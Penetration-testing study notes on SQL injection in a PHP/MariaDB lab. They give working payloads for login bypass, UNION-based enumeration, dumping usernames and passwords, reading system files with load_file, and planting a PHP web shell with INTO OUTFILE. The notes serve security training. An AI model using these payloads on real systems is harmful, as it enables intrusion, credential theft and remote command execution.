## SQL Injection (SQLi)

### PHP/MariaDB

MariaDB is very similar to MySQL. In fact, it started out as a fork of MySQL. While there are some minor differences, most of these are irrelevant to an attacker.  

We are using webappdb from Xampp.

NOTE:  These SQL injection attacks are for a PHP/MariaDB environment. While the concepts are the same for other environments, the syntax used during an attack may need to be updated to accommodate different database engines or scripting languages.  There is a standard SQL syntax, but different implementations have variations.

### CLI Access

You can login to a local MariaDB with:

```bash
mysql -u root -p
# Enter password root
```

### Queries

Notice each statement of a query is terminated with a semicolon.

#### SELECT

Retrieves info from a table.

```sql
-- Selection all data from a table
SELECT * FROM users;

-- Options
SELECT *	-- Specifies to select all fields
FROM users	-- Specifies source table
```

```sql
--- Select specific data from a table
SELECT username FROM users WHERE id=1;

-- Options
SELECT username	-- Specifies to return data from username field
WHERE id=1;		-- Specifies matching criteria for data
```

#### Other Options

| Option     | Description                                                  |
| ---------- | ------------------------------------------------------------ |
| LIMIT N    | Limits the results to N results                              |
| ORDER BY N | Orders results by a column name or column index #            |
| UNION ALL  | Combines two queries that return the same number of columns.  The 'ALL' keyword returns duplicate values. |



### Checking for Vulnerabilities

The single quote can be used to check for potential vulnerabilities.  

- Strings are denoted by single quotes `' '`.    
- If the application doesn't handle the single quote correctly, resulting in an error, this indicates a SQL injection vulnerability exists.  
- We can test all fields in this way

If the source code is available, can also review this for areas where SQL queries are built by string concatenation.  For example:

```sql
$query = "select * from users where username = '$user' and password = '$pass'";
```

If user input is included in the string without a sanitization process, the chance of SQL injection is high.  Single quotes can 'break' into the string, producing unintended stop points and allow us to inject our own code.

This page gives good information on testing MSSQL:  https://www.exploit-db.com/papers/12975

### Authentication Bypass

Inject `user' or 1=1;#` into a login field to modify the logic so the statement is always true.  This produces the following query

```sql
select * from users where name = 'user' or 1=1;#' and password = 'jones';
```

In MariaDB, `#` or `--` is a comment marker, so this reduces the query to:

```sql
select * from users where name = 'tom' or 1=1;
```

If returning multiple rows produces an error, we can limit our results to one row:

```sql
select * from users where name = 'tom' or 1=1 LIMIT 1;#
```

### Database Enumeration

We need more info about the design of the database to build more complicated SQL injection payloads.  These are specific to a type of SQL vulnerability, so they won't work with just any vulnerability.

The key is figuring out how to complete the command so you can cut it short and insert your own code.

#### Column Enumeration

We need to determine how many columns are being retrieved in order to proceed with our attack.

Using the `order by N` option, we can enumerate through integers until we get an error, indicating there is no column N.  

Example:

```html
http://192.168.216.10/debug.php?id=1 order by 1
```

We can use Burp Suite's repeater tool to simplify this process a little.  First, initiate an instance of the query in the Proxy tab, then send it to Repeater.  Manually increment the value of the `order by` option and search for 'error' in the response.  Once you know the iteration that produces the response, you know that there are N-1 columns.

#### Column Identification

The UNION statement can be used to label the columns and figure out what columns are and are not being displayed.  This is accomplished by using UNION to specify a second query that displays literal strings in each column.  We can use numbers 1,2,3,... to number the columns and see which number doesn't appear.

**NOTE:  For some DB's, the data types need to match in each column, so you can't insert an integer into a column that's text.  To convert the numbers to text, just enclose them in single quotes.**

```sql
select id, name, text FROM feedback where id=1 union all select 1,2,3;
-- Note, you may need to wrap the literal numbers in single quotes '1','2','3'
```

### Extracting Data

These commands are specific to MariaDB but other formats offer similar functionality with different syntaxes.

#### Initial Extraction

We can use one of the columns and our UNION command to print interesting information.  In this case, the 3rd column is used to print the information because it's the largest.  

- Example: Get the version of MariaDB

```sql
http://192.168.216.10/debug.php?id=1 union all select 1, 2, @@version

-- Options
--Oracle 	SELECT banner FROM v$version
--			SELECT version FROM v$instance
--Microsoft 	SELECT @@version
--PostgreSQL 	SELECT version()
--MySQL 	SELECT @@version 
--H2		SELECT H2VERSION() FROM DUAL
```

- Example: Get the current database user

```sql
http://192.168.216.10/debug.php?id=1 union all select 1, 2, user()

-- Options
user()	--Returns the user of MariaDB
```

##### Information Schema

The Information Schema table of the database provides a lot of info like table and column names, even a layout of the database.  For MariaDB, it is accessed through the `information_schema` option.

**NOTE:  Be sure your 'from...' clause appears at the end of the statement.**

- Example: Get a list of tables in the database

```sql
http://192.168.216.10/debug.php?id=1 union all select 1,  table_name, 3 from information_schema.tables
```

- Example: Show column names for a particular table

```sql
http://192.168.216.10/debug.php?id=1 union all select 1,  column_name, 3 from information_schema.columns where table_name='users'
```

More information on the Information Schema table: https://mariadb.com/kb/en/information-schema-columns-table/

#### Exfiltration

After identifying the tables and columns we're after, we can now go after specific information.

- Example:  Get the usernames and passwords from the users table

```sql
http://192.168.216.10/debug.php?id=1 union all select 1, username, password from users
```

Guides for Oracle Hacking and Enumeration:

https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573

https://hackingprofessional.github.io/Security/how-to-hack-an-Oracle-database-server/

### Code Execution

Code execution is possible given the right OS, service privileges, and filesystem permissions that allow for files to be read and written to the OS.  

Start by checking to see if you can read a file using `load_file`.  A good file on Windows to check is the `hosts` file since any user should have access to it.    Notice that when referencing a directory, we use forward slashes, even on Windows:

```sql
http://192.168.216.10/debug.php?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')
```

If this is successful, next we can try to write a file using `out_file`.  The code we are using is a simple PHP script that will allow us to execute an arbitrary command passed through a parameter (covered in the WebApp docs under Local File Inclusion).  

```sql
http://192.168.216.10/debug.php?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'
```

This command may produce an error, but that does not mean it wasn't successful.  To verify, simply test the page to see if it exists:

```sql
http://192.168.216.10/backdoor.php&cmd=ipconfig
```

H2 Database uses the FILE_WRITE(), FILE_READ() commands instead.

### Links:

https://portswigger.net/web-security/sql-injection/union-attacks

https://portswigger.net/web-security/sql-injection/cheat-sheet

https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet

https://www.exploit-db.com/papers/13650

Validate Syntax:  https://www.eversql.com/sql-syntax-check-validator/

Good technical info for outfile & loadfile:  https://www.exploit-db.com/papers/14635